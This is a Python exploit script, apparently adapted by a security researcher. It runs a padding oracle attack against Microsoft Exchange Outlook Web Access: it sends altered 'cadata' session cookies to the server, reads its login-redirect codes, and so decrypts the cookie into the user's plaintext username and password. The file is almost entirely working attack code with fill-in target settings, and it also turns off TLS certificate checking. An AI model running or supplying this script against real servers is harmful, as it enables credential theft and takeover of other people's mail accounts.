#!/usr/bin/python3
#
# The GNU AFFERO GENERAL PUBLIC LICENSE v3.0
# Modified by: MagicPiperSec
#


import sys
import logging
import requests
from requests.sessions import HTTPAdapter
import base64
from urllib.parse import urlparse, parse_qs
import ssl
from paddingoracle import BadPaddingException, PaddingOracle
from Crypto.Util.Padding import unpad

# TLS Error Handling

requests.packages.urllib3.disable_warnings()

ciphers = (
    'RSA+AESGCM:RSA+AES:RSA+HIGH:RSA+3DES:!aNULL:'
    '!eNULL:!MD5'
)

obsoleteSSL_context = requests.packages.urllib3.util.ssl_.create_urllib3_context(ciphers=ciphers)
obsoleteSSL_context.check_hostname=False
obsoleteSSL_context.verify_mode=ssl.CERT_NONE

class ObsoleteHTTPSAdapter(HTTPAdapter):
    def init_poolmanager(self, connections, maxsize, block, **pool_kwargs):
        pool_kwargs['ssl_context'] = obsoleteSSL_context
        return super().init_poolmanager(connections, maxsize, block=block, **pool_kwargs)


# User runtime Variable, MUST-MODIFY

exchange_host = "https://CHANGE ME"
exchange_path = "/owa/"
request_cookies = {"PrivateComputer": "true", "PBack": "0", "cadata": "CHANGE ME", "cadataTTL": "CHANGE ME", "cadataKey": "CHANGE ME", "cadataIV": "CHANGE ME"}
isVerbose = False
isObsoleteSSL = False
useProxy = False
request_proxies = {
    'http': 'http://127.0.0.1:8081',
    'https': 'http://127.0.0.1:8081'
} # Note: This option might help you solve the problem about TLS Negotiation

size_block = 16
request_headers = {"Connection": "close", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7"}
original_cookie = request_cookies['cadata']

# Some utilities 

def split_len(seq, length):
    return [seq[i : i + length] for i in range(0, len(seq), length)]

# Exploit Code

class ProxyOracle(PaddingOracle):
    def __init__(self, **kwargs):
        super(ProxyOracle, self).__init__(**kwargs)
        self.session = requests.Session()
        if isObsoleteSSL:
            self.session.mount(exchange_host, ObsoleteHTTPSAdapter())
        if useProxy:
            self.session.proxies = request_proxies
        self.cipherText = original_cookie

    def test_validity(self, resp):
        if resp.status_code == 302:
            reason_data = resp.headers['Location']
            respurl = urlparse(reason_data)
            if respurl.path == "/owa/auth/logon.aspx":
                respqs = parse_qs(respurl.query)
                try:
                    status = int(respqs['reason'][0])
                    if status == 2:
                        return 2  # Credential Error, Invalid Account Password
                    if status == 0:
                        return 1  # Padding Oracle, Padding Not Correct
                except KeyError:
                    return 3  # Unknown Error, cannot determine success or not.
            else:
                return 0  # No Problem, Successfully logged in.
        else:
            return 3  # Unknown Error, cannot determine success or not.

    def oracle(self, data, **kwargs):
        # post-processing
        payload_data = base64.b64encode(data)
        # set correct cookie
        request_cookies['cadata'] = payload_data.decode()
        # asking for web
        resp = self.session.get(exchange_host + exchange_path, verify=False, allow_redirects=False, headers=request_headers, cookies=request_cookies)
        # check if plaintext is recovered
        chkstatus = self.test_validity(resp)
        if chkstatus == 2:
            logging.info("[Triggered - Byte Found] Credential Error, Invalid Account Password")
            return
        elif chkstatus == 1:
            raise BadPaddingException
        elif chkstatus == 0:
            self.history.append(data)
            logging.info("[Triggered - Byte Found] Padding Oracle Found: {} ", data)
            return
        else:
            logging.error("Unknown Error, cannot determine success or not.")
            sys.exit(1)


# Final Call

def main():
    logging.basicConfig(level=logging.INFO, format='%(asctime)s | %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
    authPrefix = b"Basic "
    # start attack
    padbuster = ProxyOracle()
    fEncCookie = base64.b64decode(original_cookie.encode())
    exchangeCred = padbuster.decrypt(fEncCookie, block_size=16)  # DO NOT SET IV explicitly here, since we will always lost them.
    # print out the padded plaintext 
    print("Final (partially) decrypted data: ", exchangeCred)
    # Username and Password, unpadding
    tmpCred = unpad(exchangeCred,16,'pkcs7')
    # Append correct encoding and null-bytes prefix
    fCredBytes = "Basic AA".encode("utf_16_le") + tmpCred 
    fAuthorization = fCredBytes.decode("utf_16_le")
    # print out the final creds
    fCredB64Str = fAuthorization[6:]
    print("Final Credentials: " , "??" + base64.b64decode(fCredB64Str)[2:].decode())


if __name__ == '__main__':
    main()
